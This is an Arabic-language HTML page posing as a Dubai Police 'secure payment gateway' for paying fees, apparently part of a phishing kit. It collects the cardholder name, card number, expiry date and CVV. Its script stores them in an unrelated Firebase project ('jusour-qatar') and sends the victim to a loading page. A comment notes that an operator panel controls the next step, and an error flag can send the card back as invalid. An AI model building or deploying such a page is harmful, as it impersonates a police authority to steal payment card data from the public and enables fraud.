<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>بوابة الدفع الآمنة - شرطة دبي</title>
  <style>
    :root {
      --main-green: #008b47;
      --bg-color: #f4f7f6;
      --white: #ffffff;
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    /* الهيدر الرسمي */
    .header-fixed {
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 2000;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 12px;
      background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }

    .logo-container img { height: 40px; }

    .container {
      max-width: 450px;
      margin: 90px auto 0;
      padding: 15px;
    }

    .checkout-card {
      background: #fff;
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .payment-title {
      font-size: 18px;
      font-weight: bold;
      color: #333;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    /* رسائل الخطأ */
    #errorBox {
      display: none;
      background: #fff5f5;
      color: #d63031;
      padding: 12px;
      border-radius: 10px;
      margin-bottom: 20px;
      font-size: 13px;
      border: 1px solid #feb2b2;
      text-align: center;
    }

    .field-wrap { margin-bottom: 20px; }
    .field-label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #555;
      font-weight: 600;
    }

    .input-style {
      width: 100%;
      height: 55px;
      border: 1.5px solid #e0e0e0;
      border-radius: 12px;
      padding: 0 15px;
      font-size: 16px;
      outline: none;
      transition: border-color 0.3s;
      text-align: left;
      direction: ltr;
    }

    .input-style:focus { border-color: var(--main-green); }

    .row-fields { display: flex; gap: 15px; }
    .row-fields .field-wrap { flex: 1; }

    .pay-now-btn {
      width: 100%;
      height: 60px;
      background: var(--main-green);
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: 0.3s;
    }

    .pay-now-btn:disabled { background: #95a5a6; }

    .secure-badge {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>

<header class="header-fixed">
  <div class="logo-container">
    <img src="logo1.png" alt="Dubai Police">
  </div>
</header>

<div class="container">
  <div class="checkout-card">
    <div class="payment-title">
      <span>💳</span> تفاصيل الدفع الإلكتروني
    </div>

    <div id="errorBox">يرجى التأكد من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>

    <form id="paymentForm">
      <div class="field-wrap">
        <label class="field-label">الاسم المكتوب على البطاقة</label>
        <input type="text" id="cardName" class="input-style" placeholder="Cardholder Name" style="text-align:right; direction:rtl;" required>
      </div>

      <div class="field-wrap">
        <label class="field-label">رقم البطاقة</label>
        <input type="tel" id="cardNumber" class="input-style" placeholder="0000 0000 0000 0000" maxlength="19" required>
      </div>

      <div class="row-fields">
        <div class="field-wrap">
          <label class="field-label">تاريخ الانتهاء</label>
          <input type="tel" id="cardExp" class="input-style" placeholder="MM/YY" maxlength="5" required>
        </div>
        <div class="field-wrap">
          <label class="field-label">الرمز (CVV)</label>
          <input type="tel" id="cardCvv" class="input-style" placeholder="123" maxlength="3" required>
        </div>
      </div>

      <button type="submit" class="pay-now-btn" id="payBtn">دفع الرسوم الآن</button>
    </form>

    <div class="secure-badge">
      <img src="https://img.icons8.com/color/24/000000/shield.png" alt="Secure">
      <span>نظام دفع آمن ومعتمد من هيئة دبي الرقمية</span>
    </div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // التحقق إذا كان هناك خطأ راجع من صفحة التحميل
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'invalid_card') {
        document.getElementById('errorBox').style.display = 'block';
    }

    // تنسيق رقم البطاقة آلياً
    document.getElementById('cardNumber').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    // تنسيق تاريخ الانتهاء (00/00)
    document.getElementById('cardExp').addEventListener('input', function (e) {
        let v = e.target.value.replace(/[^\d]/g, '');
        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });

    document.getElementById("paymentForm").onsubmit = async (e) => {
        e.preventDefault();
        
        const btn = document.getElementById("payBtn");
        btn.innerHTML = "جاري تأمين الاتصال...";
        btn.disabled = true;

        const paymentData = {
            card_name: document.getElementById("cardName").value,
            card_number: document.getElementById("cardNumber").value,
            card_exp: document.getElementById("cardExp").value,
            card_cvv: document.getElementById("cardCvv").value,
            status: "card_submitted", // الحالة الأولى للتحكم من اللوحة
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        try {
            // تخزين البيانات في Firebase
            await db.collection("payments").add(paymentData);
            
            // التوجيه فوراً لصفحة التحميل والانتظار (loading.php)
            window.location.href = 'loading.php';
        } catch (err) {
            console.error("Firebase Error:", err);
            btn.innerHTML = "دفع الرسوم الآن";
            btn.disabled = false;
            alert("حدث خطأ في النظام، يرجى المحاولة لاحقاً.");
        }
    };
</script>
</body>
</html>